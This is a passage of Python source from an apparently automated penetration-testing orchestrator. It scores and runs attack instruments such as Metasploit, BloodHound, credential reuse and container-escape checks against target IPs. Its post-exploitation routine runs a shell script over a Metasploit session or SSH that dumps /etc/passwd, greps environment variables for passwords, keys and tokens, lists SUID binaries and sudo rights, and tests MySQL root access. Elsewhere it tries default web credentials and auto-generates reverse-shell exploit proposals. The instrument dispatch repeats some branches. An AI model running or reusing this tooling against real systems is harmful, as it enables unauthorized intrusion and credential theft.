        available=AI_PROBE_PATH.exists(),
    )

    # Credential reuse — cross-surface credential testing
    # Wavelength: SSH initial access wickets + web auth wickets
    # The energy contribution is coupling energy: untested cred × service pairs.
    # Available whenever the cred_reuse module is present (no external deps needed
    # for proposal generation; paramiko required for live SSH testing).
    cred_reuse_path = Path(__file__).parent / "cred_reuse.py"
    instruments["cred_reuse"] = Instrument(
        name="cred_reuse",
        description="Credential reuse — cross-surface testing of found credentials (SSH + HTTP)",
        wavelength=["HO-02", "HO-03", "WB-08", "WB-20"],
        cost=1.5,
        available=cred_reuse_path.exists(),
    )

    return instruments


# ── Field energy computation ─────────────────────────────────────────────

def load_wicket_states(ip: str) -> dict:
    """
    Load and kernel-aggregate all wicket observations for a target.

    Replaces last-write-wins with support vector aggregation:
      SupportEngine.aggregate() → CollapseThresholds → StateEngine.collapse()

    Returns {wicket_id: {"status": str, "detail": str, "ts": str, "phi_r": float, "phi_b": float, "phi_u": float}}
    Compatible with all existing callers.
    """
    return _kernel.states_with_detail(ip)


def _load_events_file(path: str, states: dict, filter_ip: str = None):
    """Load events from an NDJSON file into states dict."""
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                event = json.loads(line)
                payload = event.get("payload", {})

                # Filter by IP if specified
                if filter_ip:
                    wid_ip = payload.get("workload_id", "")
                    target_ip = payload.get("target_ip", "")
                    if filter_ip not in wid_ip and filter_ip not in target_ip:
                        continue

                wid = payload.get("wicket_id")
                status = payload.get("status")
                detail = payload.get("detail", "")
                ts = event.get("ts", "")

                if wid and status:
                    prev_ts = states.get(wid, {}).get("ts", "")
                    if ts >= prev_ts:
                        states[wid] = {
                            "status": status,
                            "detail": detail,
                            "ts": ts,
                        }
    except Exception:
        pass


def field_entropy(states: dict, applicable_wickets: set, ip: str = "", folds=None) -> float:
    """
    Compute field energy E for a target via kernel EnergyEngine.
    E = |unknown wickets in applicable set| + fold weights.

    Routes through KernelStateEngine.energy() which uses the formal
    EnergyEngine.compute() from skg.kernel.energy.
    """
    if not applicable_wickets:
        return 0.0
    if ip:
        return _kernel.energy(ip, applicable_wickets, folds or [])
    # Fallback: use pre-loaded states dict (legacy callers)
    from skg.substrate.node import TriState
    unknown = sum(1 for wid in applicable_wickets
                  if (states.get(wid, {}) if isinstance(states.get(wid), dict)
                      else {"status": str(states.get(wid, "unknown"))}).get("status", "unknown") == "unknown")
    fold_weight = sum(f.gravity_weight() for f in (folds or []))
    return float(unknown) + fold_weight


def _project_gravity_events(events_file: Path, run_id: str, result: dict) -> None:
    """Best-effort projection of a fresh gravity event file into INTERP_DIR."""
    try:
        from skg.sensors.projector import project_event_file
    except Exception:
        return
    if not events_file.exists():
        return
    try:
        INTERP_DIR.mkdir(parents=True, exist_ok=True)
        outputs = project_event_file(events_file, INTERP_DIR, run_id=run_id[:8])
        if not outputs:
            return
        result["interp_files"] = [str(p) for p in outputs]
        if len(outputs) == 1:
            result["interp_file"] = str(outputs[0])
    except Exception:
        pass

def entropy_reduction_potential(
    instrument: "Instrument",
    target_ip: str,
    states: dict,
    applicable_wickets: set,
    folds=None,
) -> float:
    """
    Compute instrument selection potential via kernel GravityScheduler.

    Routes through KernelStateEngine.instrument_potential() which uses:
      - SupportEngine for current wicket states
      - GravityScheduler.rank() for formal potential scoring
      - MSF escalation boost for confirmed high-value preconditions
    """
    if not instrument.available or not applicable_wickets:
        return 0.0

    # Hard failures (999 sentinel) → excluded
    history = instrument.entropy_history.get(target_ip, [])
    if history and history[-1] >= 500:
        return 0.0

    # Soft no-change penalty
    failure_penalty = 1.0
    if history and len(history) >= 2 and history[-1] >= history[-2]:
        failure_penalty = 0.2

    return _kernel.instrument_potential(
        instrument_name=instrument.name,
        instrument_wavelength=instrument.wavelength,
        instrument_cost=instrument.cost,
        target_ip=target_ip,
        applicable_wickets=applicable_wickets,
        folds=folds,
        failure_penalty=failure_penalty,
    )


def _bounded_field_pull_boost(
    ip: str,
    effective_domains: set[str],
    sphere_pulls: dict[str, float],
    fiber_clusters_by_anchor: dict[str, object],
    sphere_persistence: dict[str, float] | None = None,
) -> float:
    from skg.topology.energy import anchored_field_pull
    return anchored_field_pull(
        ip,
        effective_domains,
        sphere_pulls,
        fiber_clusters_by_anchor,
        sphere_persistence=sphere_persistence,
    )

def load_all_wicket_ids() -> dict:
    """Load wicket IDs from all catalogs, grouped by domain. MERGES same-domain catalogs."""
    domain_wickets: dict = {}
    # Search all known catalog locations
    search_roots = [SKG_HOME]
    seen_files: set = set()
    for root in search_roots:
        for catalog_file in glob.glob(str(root / "skg-*-toolchain" / "contracts" / "catalogs" / "*.json")):
            if catalog_file in seen_files:
                continue
            seen_files.add(catalog_file)
            try:
                data = json.loads(Path(catalog_file).read_text())
                domain = data.get("domain", "unknown")
                wickets = set(data.get("wickets", {}).keys())
                # MERGE: two web catalogs both contribute their wickets
                if domain in domain_wickets:
                    domain_wickets[domain].update(wickets)
                else:
                    domain_wickets[domain] = wickets
            except Exception:
                continue
    return domain_wickets


# ── Instrument execution ────────────────────────────────────────────────

def execute_instrument(instrument: Instrument, target: dict,
                       run_id: str, out_dir: Path,
                       current_states: dict = None,
                       authorized: bool = False) -> dict:
    """
    Execute an instrument against a target.
    current_states: wicket states at time of selection (for MSF RC branching)
    Returns dict with results and entropy change.
    """
    ip = target["ip"]
    result = {
        "instrument": instrument.name,
        "target": ip,
        "events_before": 0,
        "events_after": 0,
        "new_findings": [],
        "success": False,
    }

    # Count field state before
    states_before = load_wicket_states(ip)
    unknown_before = sum(1 for s in states_before.values() if s.get("status") == "unknown")
    unresolved_before = sum(float(s.get("local_energy", 0.0) or s.get("phi_u", 0.0) or 0.0) for s in states_before.values())

    if instrument.name == "http_collector":
        result = _exec_http_collector(ip, target, run_id, out_dir, result)

    elif instrument.name == "auth_scanner":
        result = _exec_auth_scanner(ip, target, run_id, out_dir, result)

    elif instrument.name == "nvd_feed":
        result = _exec_nvd_feed(ip, target, run_id, out_dir, result)

    elif instrument.name == "metasploit":
        result = _exec_metasploit(ip, target, run_id, out_dir, result, current_states or states_before, authorized=authorized)

    elif instrument.name == "pcap":
        result = _exec_pcap(ip, target, run_id, out_dir, result)

    elif instrument.name == "nmap":
        result = _exec_nmap(ip, target, run_id, out_dir, result)

    elif instrument.name == "ssh_sensor":
        result = _exec_ssh_sensor(ip, target, run_id, out_dir, result)

    elif instrument.name == "bloodhound":
        result = _exec_bloodhound(ip, target, run_id, out_dir, result)

    elif instrument.name == "iot_firmware":
        result = _exec_iot_firmware(ip, target, run_id, out_dir, result)

    elif instrument.name == "ai_probe":
        result = _exec_ai_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "supply_chain":
        result = _exec_supply_chain(ip, target, run_id, out_dir, result)

    elif instrument.name == "data_profiler":
        result = _exec_data_profiler(ip, target, run_id, out_dir, result)

    elif instrument.name == "sysaudit":
        result = _exec_sysaudit(ip, target, run_id, out_dir, result)

    elif instrument.name == "iot_firmware":
        result = _exec_iot_firmware(ip, target, run_id, out_dir, result)

    elif instrument.name == "ai_probe":
        result = _exec_ai_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "supply_chain":
        result = _exec_supply_chain(ip, target, run_id, out_dir, result)



    elif instrument.name == "container_inspect":
        result = _exec_container_inspect(ip, target, run_id, out_dir, result)
    elif instrument.name == "binary_analysis":
        result = _exec_binary_analysis(ip, target, run_id, out_dir, result)
    elif instrument.name == "cred_reuse":
        result = _exec_cred_reuse(ip, target, run_id, out_dir, result, authorized=authorized)

    # Count field state after
    states_after = load_wicket_states(ip)
    unknown_after = sum(1 for s in states_after.values() if s.get("status") == "unknown")
    unresolved_after = sum(float(s.get("local_energy", 0.0) or s.get("phi_u", 0.0) or 0.0) for s in states_after.values())
    result["unknowns_resolved"] = unknown_before - unknown_after
    result["unresolved_energy_reduced"] = round(unresolved_before - unresolved_after, 6)

    # Track entropy history for this instrument
    instrument.entropy_history.setdefault(ip, []).append(unresolved_after)
    instrument.last_used_on[ip] = iso_now()

    return result


def _exec_bloodhound(ip, target, run_id, out_dir, result):
    """
    Collect the AD domain graph from BloodHound CE or Neo4j and emit AD wickets.
    """
    import os as _os
    import shutil as _shutil

    bh_url      = _os.environ.get("BH_URL", "http://localhost:8080")
    bh_user     = _os.environ.get("BH_USERNAME", "admin")
    bh_pass     = _os.environ.get("BH_PASSWORD", "")
    neo4j_url   = _os.environ.get("NEO4J_URL", "bolt://localhost:7687")
    neo4j_user  = _os.environ.get("NEO4J_USER", "neo4j")
    neo4j_pass  = _os.environ.get("NEO4J_PASSWORD", "")

    domains_for_target = target.get("domains", [])
    workload_id = next((d for d in domains_for_target if "ad" in d.lower()), f"ad::{ip}")
    attack_path_id = "ad_kerberoast_v1"

    print(f"    [BH] Collecting AD graph for {workload_id}...")

    try:
        if str(REPO_ROOT) not in sys.path:
            sys.path.insert(0, str(REPO_ROOT))
        from skg.sensors.bloodhound_sensor import (
            BloodHoundCEClient, Neo4jClient, collect_via_api,
            collect_via_neo4j, write_bh_dir,
        )
        from skg.sensors.adapter_runner import run_bloodhound
        from skg.core.paths import SKG_STATE_DIR
    except ImportError as exc:
        result["error"] = f"BloodHound sensor import failed: {exc}"
        return result

    data = None
    if bh_pass:
        try:
            client = BloodHoundCEClient(bh_url, bh_user, bh_pass)
            data = collect_via_api(client)
        except Exception as exc:
            print(f"    [BH] CE API failed ({exc}), trying Neo4j...")

    if data is None and neo4j_pass:
        try:
            client = Neo4jClient(neo4j_url, neo4j_user, neo4j_pass)
            data = collect_via_neo4j(client)
            client.close()
        except Exception as exc:
            result["error"] = f"Neo4j also unavailable: {exc}"
            return result

    if data is None:
        result["success"] = False
        result["error"] = "No BloodHound source reachable (set BH_PASSWORD or NEO4J_PASSWORD)"
        return result

    bh_dir = SKG_STATE_DIR / "bh_cache" / run_id[:8]
    _shutil.rmtree(bh_dir, ignore_errors=True)
    write_bh_dir(data, bh_dir)

    try:
        events = run_bloodhound(bh_dir, workload_id, attack_path_id, run_id)
    except Exception as exc:
        result["error"] = f"BloodHound adapter failed: {exc}"
        return result

    ev_file = out_dir / f"gravity_bh_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / ev_file.name).write_text(ev_file.read_text())
    except Exception:
        pass

    result["success"] = True
    result["events"] = len(events)
    result["events_file"] = str(ev_file)
    _project_gravity_events(ev_file, run_id, result)
    print(f"    [BH] {workload_id}: {len(events)} AD wicket events → {ev_file.name}")
    return result



def _exec_ai_probe(ip, target, run_id, out_dir, result):
    """
    Run the AI/ML service probe against ip.
    Probes all known AI service ports: Ollama :11434, OpenAI-compat, Qdrant,
    Chroma, Jupyter, MLflow, Triton, TorchServe, LangServe, TensorBoard.
    Emits AI-01..AI-20 wicket events.
    """
    AI_ADAPTER = SKG_HOME / "skg-ai-toolchain" / "adapters" / "ai_probe" / "probe.py"
    try:
        ai_probe = _load_module_from_file("skg_ai_probe", AI_ADAPTER)
        probe_device = ai_probe.probe_device
    except Exception as e:
        result["error"] = f"ai_probe adapter not found: {e}"
        return result

    workload_id = f"ai_target::{ip}"
    events_file = out_dir / f"gravity_ai_{ip.replace('.','_')}_{run_id[:8]}.ndjson"

    events = probe_device(
        host=ip,
        workload_id=workload_id,
        run_id=run_id,
        attack_path_id="ai_llm_extract_v1",
        out_path=str(events_file),
    )

    realized = [e["wicket_id"] for e in events if e["status"] == "realized"]
    blocked  = [e["wicket_id"] for e in events if e["status"] == "blocked"]

    if realized or blocked:
        print(f"    [AI-PROBE] {ip}: {len(realized)}R {len(blocked)}B "
              f"— {realized[:5]}")
        result["success"] = True
        result["events"]  = len(events)
    else:
        print(f"    [AI-PROBE] {ip}: no AI/ML services observed")
        result["success"] = True
        result["events"]  = 0

    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception:
        pass
    _project_gravity_events(events_file, run_id, result)

    return result


def _exec_post_exploitation(ip, target, run_id, out_dir, result, session_id=None):
    """
    Run post-exploitation data collection after a Meterpreter/shell session opens.
    
    Collects:
      HO-03: valid credentials (from passwd/shadow)
      HO-07: SUID binaries present
      HO-06: sudo misconfiguration
      HO-09: credentials in environment
      HO-10: running as root
      WB-20: database access (from running mysql process / creds in config)
      CE-01: running inside container (from .dockerenv, cgroup)
    
    Writes events to gravity_postexp_{ip}_{run_id}.ndjson.
    """
    import subprocess as _sp
    import uuid as _uuid

    now = datetime.now(timezone.utc).isoformat()
    events_file = out_dir / f"gravity_postexp_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    workload_id = f"host::{ip}"

    def make_event(wicket_id, status, confidence, detail):
        return json.dumps({
            "id": str(_uuid.uuid4()), "ts": now,
            "type": "obs.attack.precondition",
            "source": {"source_id": "adapter.post_exploitation", "toolchain": "skg-host-toolchain"},
            "payload": {"wicket_id": wicket_id, "status": status,
                       "workload_id": workload_id, "target_ip": ip,
                       "attack_path_id": "host_linux_privesc_sudo_v1",
                       "run_id": run_id, "detail": detail},
            "provenance": {"evidence_rank": 1,
                          "evidence": {"source_kind": "runtime", "pointer": ip,
                                       "collected_at": now, "confidence": confidence}}
        }) + "\n"

    post_commands = """
echo "---SKG-WHOAMI---"
whoami && id
echo "---SKG-HOSTNAME---"
hostname && uname -a
echo "---SKG-DOCKER---"
ls /.dockerenv 2>/dev/null && echo DOCKER_ENV_FOUND || echo NO_DOCKER_ENV
cat /proc/1/cgroup 2>/dev/null | head -5
echo "---SKG-SUDO---"
sudo -l -n 2>/dev/null | head -20
echo "---SKG-SUID---"
find / -perm -4000 -type f 2>/dev/null | head -20
echo "---SKG-PASSWD---"
cat /etc/passwd | head -20
echo "---SKG-ENV---"
env | grep -iE "pass|pwd|key|secret|token|db_" | head -10
echo "---SKG-MYSQL---"
mysql -u root -e "show databases;" 2>/dev/null || echo NO_MYSQL_ROOT
echo "---SKG-DONE---"
"""

    # Check for active MSF sessions using msfconsole -x
    try:
        check = _sp.run(
            ["msfconsole", "-q", "-x", "sessions -l; exit"],
            capture_output=True, text=True, timeout=30
        )
        session_output = check.stdout + check.stderr
    except Exception as e:
        result["error"] = f"Session check failed: {e}"
        return result

    has_msf_session = "No active sessions" not in session_output and any(
        str(i) in session_output for i in range(1, 20)
    )

    output = ""
    if has_msf_session:
        # Session exists — run post-exploitation RC
        post_rc = out_dir / f"postexp_{ip.replace('.','_')}_{run_id[:8]}.rc"
        post_rc_content = f"""
# Post-exploitation data collection for {ip}
# Runs in session {session_id or 1}
sessions -i {session_id or 1}
shell
{post_commands}
exit
"""
        post_rc.write_text(post_rc_content)

        try:
            post_out = _sp.run(
                ["msfconsole", "-q", "-r", str(post_rc)],
                capture_output=True, text=True, timeout=120
            )
            output = post_out.stdout + post_out.stderr
        except Exception as e:
            result["error"] = f"Post-exploitation failed: {e}"
            return result
    else:
        # Fall back to the same SSH foothold SKG already validated elsewhere.
        try:
            client, used, last_exc = _connect_ssh_with_fallback(
                ip,
                f"host::{ip}",
                "host_linux_privesc_sudo_v1",
            )
        except Exception as e:
            result["success"] = False
            result["error"] = f"No active session and SSH fallback unavailable: {e}"
            return result
        if client is None or used is None:
            result["success"] = False
            result["error"] = f"No active session and SSH fallback failed: {last_exc}"
            return result
        try:
            _, stdout, stderr = client.exec_command(post_commands, timeout=60)
            output = stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")
            result["collection_mode"] = "ssh_fallback"
            result["ssh_user"] = used.get("user")
        finally:
            try:
                client.close()
            except Exception:
                pass

    # Parse output and emit wicket events
    events = []

    # HO-10: running as root
    if "root" in output.lower() and ("uid=0" in output or "whoami" in output.lower()):
        events.append(make_event("HO-10","realized",0.99,"Running as root (uid=0)"))

    # HO-07: SUID binaries
    suid_lines = [l for l in output.split("\n") if "---SKG-SUID---" in output
                  and l.strip().startswith("/")]
    if suid_lines or "/usr/bin/sudo" in output or "/bin/su" in output:
        events.append(make_event("HO-07","realized",0.90,
            f"SUID binaries found: {suid_lines[:3]}"))

    # HO-06: sudo misconfiguration
    if "NOPASSWD" in output or "(ALL)" in output:
        events.append(make_event("HO-06","realized",0.95,
            "sudo NOPASSWD or ALL found"))

    # HO-09: credentials in environment
    env_lines = [l for l in output.split("\n")
                 if any(k in l.upper() for k in ("PASS","PWD","KEY","SECRET","TOKEN"))]
    if env_lines:
        events.append(make_event("HO-09","realized",0.85,
            f"Credentials in env: {env_lines[:2]}"))

    # CE-01: container escape possible (running in Docker)
    if "DOCKER_ENV_FOUND" in output or "docker" in output.lower():
        events.append(make_event("CE-01","realized",0.90,
            "Running inside Docker container (/.dockerenv found)"))

    # WB-20: database access
    if "NO_MYSQL_ROOT" not in output and "Database" in output:
        events.append(make_event("WB-20","realized",0.95,
            "MySQL accessible as root — database access confirmed"))

    # HO-03: valid system credentials accessible
    passwd_lines = [l for l in output.split("\n") if ":" in l and l.startswith("root")]
    if passwd_lines:
        events.append(make_event("HO-03","realized",0.80,
            f"System passwd accessible: {passwd_lines[0][:80]}"))

    if not events:
        # At minimum we have code execution
        events.append(make_event("HO-10","realized",0.70,"Shell obtained — code execution confirmed"))

    with open(events_file, "w") as fh:
        for ev in events:
            fh.write(ev)

    print(f"    [POST-EXP] {ip}: {len(events)} wicket events from session")
    for ev in events:
        d = json.loads(ev)
        print(f"      {d['payload']['wicket_id']} {d['payload']['status']} — {d['payload']['detail'][:60]}")

    result["success"] = True
    result["events"] = len(events)
    result["events_file"] = str(events_file)
    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception:
        pass
    _project_gravity_events(events_file, run_id, result)
    return result

def _exec_http_collector(ip, target, run_id, out_dir, result):
    """Run the web collector."""
    web_ports = target.get("web_ports", [])
    if not web_ports:
        # Infer from services
        for svc in target.get("services", []):
            if svc["service"] in ("http", "https", "http-alt", "https-alt"):
                scheme = "https" if "https" in svc["service"] else "http"
                web_ports.append((svc["port"], scheme))

    for port, scheme in web_ports[:2]:
        url = f"{scheme}://{ip}:{port}"
        events_file = out_dir / f"gravity_http_{ip}_{port}.ndjson"
        try:
            from collector import collect
            collect(target=url, out_path=str(events_file),
                    attack_path_id="web_sqli_to_shell_v1",
                    run_id=run_id, workload_id=f"web::{ip}",
                    timeout=8.0)
            # Stamp target_ip into every event for cross-file filtering
            if events_file.exists():
                lines = events_file.read_text().splitlines()
                stamped = []
                for line in lines:
                    if not line.strip():
                        continue
                    try:
                        ev = json.loads(line)
                        ev.setdefault("payload", {})["target_ip"] = ip
                        stamped.append(json.dumps(ev))
                    except Exception:
                        stamped.append(line)
                content = "\n".join(stamped) + "\n"
                events_file.write_text(content)
                # Mirror to EVENTS_DIR so FoldDetector and daemon sensor loop
                # can also read these observations
                EVENTS_DIR.mkdir(parents=True, exist_ok=True)
                mirror = EVENTS_DIR / events_file.name
                mirror.write_text(content)
                _project_gravity_events(events_file, run_id, result)

            result["success"] = True
        except Exception as e:
            result["error"] = str(e)

    return result


def _exec_auth_scanner(ip, target, run_id, out_dir, result):
    """Run the authenticated scanner."""
    web_ports = []
    for svc in target.get("services", []):
        if svc["service"] in ("http", "https", "http-alt", "https-alt"):
            scheme = "https" if "https" in svc["service"] else "http"
            web_ports.append((svc["port"], scheme))

    # Load per-target web credentials from targets.yaml
    username = None
    password = None
    targets_file = Path("/etc/skg/targets.yaml")
    if targets_file.exists():
        try:
            import yaml as _yaml
            data = _yaml.safe_load(targets_file.read_text())
            for t in (data or {}).get("targets", []):
                if t.get("host") == ip or t.get("url", "").find(ip) >= 0:
                    auth = t.get("auth", {})
                    username = auth.get("user") or t.get("web_user")
                    password = auth.get("password") or t.get("web_password")
                    break
        except Exception:
            pass

    for port, scheme in web_ports[:1]:
        url = f"{scheme}://{ip}:{port}"
        events_file = out_dir / f"gravity_auth_{ip}_{port}.ndjson"
        try:
            from auth_scanner import auth_scan
            auth_scan(target=url, out_path=str(events_file),
                      attack_path_id="web_sqli_to_shell_v1",
                      try_defaults=True, run_id=run_id,
                      workload_id=f"web::{ip}",
                      username=username,
                      password=password,
                      timeout=10.0)
            if events_file.exists():
                lines = events_file.read_text().splitlines()
                stamped = []
                for line in lines:
                    if not line.strip():
                        continue
                    try:
                        ev = json.loads(line)
                        ev.setdefault("payload", {})["target_ip"] = ip
                        stamped.append(json.dumps(ev))
                    except Exception:
                        stamped.append(line)
                content = "\n".join(stamped) + "\n"
                events_file.write_text(content)
                EVENTS_DIR.mkdir(parents=True, exist_ok=True)
                mirror = EVENTS_DIR / events_file.name
                mirror.write_text(content)
                _project_gravity_events(events_file, run_id, result)
            result["success"] = True

            # Auto-generate exploit proposals when high-value findings confirmed
            # Don't wait for MSF to be gradient-selected -- act on confirmed findings now
            try:
                states = load_wicket_states(ip)
                realized = [w for w, s in states.items() if s.get("status") == "realized"]
                high_value = {"WB-09", "WB-14", "WB-10", "WB-20"}
                confirmed = [w for w in realized if w in high_value]
                if confirmed:
                    from exploit_dispatch import generate_exploit_proposals, _get_lhost as _dispatch_lhost
                    lhost = _get_lhost()
                    for path_id in ["web_cmdi_to_shell_v1", "web_sqli_to_shell_v1"]:
                        try:
                            props = generate_exploit_proposals(
                                path_id=path_id,
                                target_ip=ip,
                                port=port,
                                realized_wickets=realized,
                                lhost=lhost,
                                out_dir=out_dir,
                            )
                            if props:
                                print(f"    [EXPLOIT] {len(props)} proposal(s) generated for {path_id}")
                        except Exception:
                            pass
            except Exception:
                pass

        except Exception as e:
            result["error"] = str(e)

    return result


def _exec_cred_reuse(ip, target, run_id, out_dir, result, authorized=False):
    """
    Credential reuse instrument.

    Tests all stored credentials against credential-accepting services on
    this target. Coupling energy drives gravity selection — when credentials
    exist that haven't been tried here, this instrument has high potential.

    authorized=True: runs tests directly.
    authorized=False: generates operator-gated proposals.
    """
    try:
        import sys as _sys
        _sys.path.insert(0, str(Path(__file__).parent))
        from cred_reuse import CredentialStore, run_reuse_sweep, reuse_energy

        store = CredentialStore()
        E_before = reuse_energy(ip, target, store)

        events = run_reuse_sweep(
            target_ip=ip,
            surface=target,
            events_dir=EVENTS_DIR,
            out_dir=out_dir,
            store=store,
            authorized=authorized,
        )

        E_after = reuse_energy(ip, target, store)
        result["success"] = True
        result["cred_events"] = len(events)
        result["cred_energy_before"] = E_before
        result["cred_energy_after"] = E_after
        result["cred_energy_reduced"] = round(E_before - E_after, 2)

    except Exception as exc:
        result["success"] = False
        result["error"] = f"cred_reuse: {exc}"
        log.warning(f"[cred_reuse] instrument error: {exc}")

    return result


def _exec_container_inspect(ip, target, run_id, out_dir, result):
    """Run docker inspect from the host against a container at ip.
    Emits CE-01..CE-07 wickets without needing SSH into the container.
    """
    import sys as _sys
    _sys.path.insert(0, "/opt/skg/skg-container-escape-toolchain/adapters/container_inspect")
    try:
        from parse import (
            check_running_as_root,
            check_privileged,
            check_docker_socket,
            check_host_network,
            check_sensitive_mounts,
            check_cap_sys_admin,
        )
    except ImportError as e:
        result["error"] = f"container_inspect adapter not found: {e}"
        return result

    # Find container ID for this IP via docker inspect
    try:
        r = subprocess.run(
            ["docker","ps","-q"],
            capture_output=True, text=True, timeout=5
        )
        container_ids = r.stdout.strip().split()
    except Exception as e:
        result["error"] = f"docker ps failed: {e}"
        return result

    matched_inspect = None
    for cid in container_ids:
        try:
            r2 = subprocess.run(
                ["docker","inspect","--format",
                 "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", cid],
                capture_output=True, text=True, timeout=5
            )
            if ip in r2.stdout:
                r3 = subprocess.run(["docker","inspect",cid],
                                    capture_output=True, text=True, timeout=5)
                import json as _json
                data = _json.loads(r3.stdout)
                matched_inspect = data[0] if data else None
                break
        except Exception:
            continue

    if not matched_inspect:
        result["error"] = f"No docker container found at {ip}"
        return result

    events_file = out_dir / f"gravity_ce_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    workload_id = f"container_escape::{ip}"
    attack_path_id = "container_escape_privileged_v1"

    caps = matched_inspect.get("HostConfig",{}).get("CapAdd") or []
    cap_drop = matched_inspect.get("HostConfig",{}).get("CapDrop") or []

    emit_fn_args = (matched_inspect, caps, events_file, attack_path_id, run_id, workload_id)

    try:
        check_running_as_root(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_privileged(matched_inspect, caps, events_file, attack_path_id, run_id, workload_id)
        check_docker_socket(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_host_network(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_sensitive_mounts(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_cap_sys_admin(matched_inspect, caps, events_file, attack_path_id, run_id, workload_id)
    except Exception as e:
        result["error"] = f"container_inspect failed: {e}"
        return result

    # Count events written
    try:
        n = sum(1 for l in events_file.read_text().splitlines() if l.strip())
    except Exception:
        n = 0

    # Mirror to EVENTS_DIR
    if events_file.exists():
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())

    # Run CE projection
    try:
        ce_proj = SKG_HOME / "skg-container-escape-toolchain" / "projections" / "escape" / "run.py"
        interp_file = INTERP_DIR / f"ce_{ip.replace('.','_')}_{run_id[:8]}.json"
        INTERP_DIR.mkdir(parents=True, exist_ok=True)
        if ce_proj.exists():
            subprocess.run(
                [sys.executable, str(ce_proj),
                 "--in", str(events_file),
                 "--out", str(interp_file),
                 "--attack-path-id", attack_path_id],
                capture_output=True, timeout=30,
                cwd=str(SKG_HOME / "skg-container-escape-toolchain" / "projections")
            )
    except Exception:
        pass

    result["success"] = True
    result["events"] = n
    print(f"    [CE] {ip}: {n} container wicket events")

    # Defer follow-on proposal generation to the main gravity thread so it is
    # visible to the operator and interactive review happens on the foreground TTY.
    try:
        states = load_wicket_states(ip)
        realized = {
            w for w, s in states.items()
            if isinstance(s, dict) and s.get("status") == "realized"
        }
        follow_on = []
        if {"CE-01", "CE-02"}.issubset(realized):
            follow_on.append({"path_id": "container_escape_privileged_v1", "port": 22, "kwargs": {}})
        if {"CE-01", "CE-03", "CE-14"}.issubset(realized):
            follow_on.append({"path_id": "container_escape_socket_v1", "port": 22, "kwargs": {}})
        if follow_on:
            result["follow_on_paths"] = follow_on
    except Exception:
        pass
    return result


def _exec_nvd_feed(ip, target, run_id, out_dir, result):
    """Run NVD CVE lookup for discovered services."""
    api_key = _load_nvd_key()
    if not api_key:
        result["error"] = "No NVD API key"
        return result

    services_to_check = _nvd_service_candidates(ip, target)

    if not services_to_check:
        result["error"] = "No service versions discovered"
        return result

    try:
        sys.path.insert(0, str(FEEDS_PATH))
        from nvd_ingester import ingest_service
        CVE_DIR.mkdir(parents=True, exist_ok=True)
        events_file = CVE_DIR / f"cve_events_{ip}_{run_id[:8]}.ndjson"

        total_candidates = 0
        for svc in services_to_check:
            candidates = ingest_service(svc, ip, events_file, api_key, run_id)
            total_candidates += len(candidates)

        result["success"] = True
        result["services_checked"] = len(services_to_check)
        result["service_inputs"] = services_to_check[:12]
        result["cve_candidates"] = total_candidates
    except Exception as e:
        result["error"] = str(e)

    return result


def _nvd_service_candidates(ip, target):
    """
    Build NVD lookup inputs from the canonical target/service inventory first,
    then fall back to narrower web-version disclosure detail.
    """

    def _add(acc, value):
        if value is None:
            return
        text = str(value).strip()
        if not text:
            return
        if text not in acc:
            acc.append(text)

    services_to_check = []

    for svc in list((target or {}).get("services") or []):
        banner = svc.get("banner")
        product = svc.get("product")
        version = svc.get("version")
        service = svc.get("service")
        extrainfo = svc.get("extrainfo")

        if banner:
            _add(services_to_check, banner)

        if product and version:
            _add(services_to_check, f"{product}/{version}")
        elif service and version:
            _add(services_to_check, f"{service}/{version}")

        if product and extrainfo:
            _add(services_to_check, f"{product} {extrainfo}")
        elif service and extrainfo:
            _add(services_to_check, f"{service} {extrainfo}")

    # Supplemental web disclosure detail for version strings not present in the
    # canonical service inventory yet.
    try:
        states = load_wicket_states(ip)
        wb02 = states.get("WB-02", {})
        detail = wb02.get("detail", "")
        try:
            headers = json.loads(detail)
            for val in headers.values():
                _add(services_to_check, val)
        except (json.JSONDecodeError, TypeError):
            _add(services_to_check, detail)
    except Exception:
        pass

    return services_to_check


def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorized=False):
    """
    Use Metasploit for targeted observation or exploitation.
    Generates an RC script based on current confirmed wicket states:
      - WB-14 (CMDI) realized → exploit/multi/handler with reverse shell
      - WB-09 (SQLi injectable) realized → sqlmap-style extraction module
      - WB-21 (webshell upload) realized → exploit/multi/handler
      - default → auxiliary scanner (enumeration, not exploitation)
    Deduplicates: only one pending proposal per ip:port allowed.
    """
    import re as _re

    web_ports = [svc["port"] for svc in target.get("services", [])
                 if svc.get("service","") in ("http","https","http-alt","https-alt")]
    if not web_ports:
        result["error"] = "No web ports for MSF"
        return result
    port = web_ports[0]

    # ── Dedup: skip if a pending proposal already exists for this ip:port ────
    proposals_dir = SKG_STATE_DIR / "proposals"
    if proposals_dir.exists():
        _now_ts = datetime.now(timezone.utc)
        existing_pending = []
        for _f in proposals_dir.glob("*.json"):
            try:
                _p = json.loads(_f.read_text()) if _f.stat().st_size < 50000 else {}
            except Exception:
                continue
            if not (_p.get("status") == "pending" and
                    str(port) in _p.get("description","") and
                    ip in _p.get("description","")):
                continue
            # Expire pending proposals older than 4 hours — they're stale
            try:
                _age = _now_ts - datetime.fromisoformat(_p.get("generated_at","1970-01-01T00:00:00+00:00"))
                if _age.total_seconds() > 14400:
                    _p["status"] = "expired"
                    _f.write_text(json.dumps(_p, indent=2))
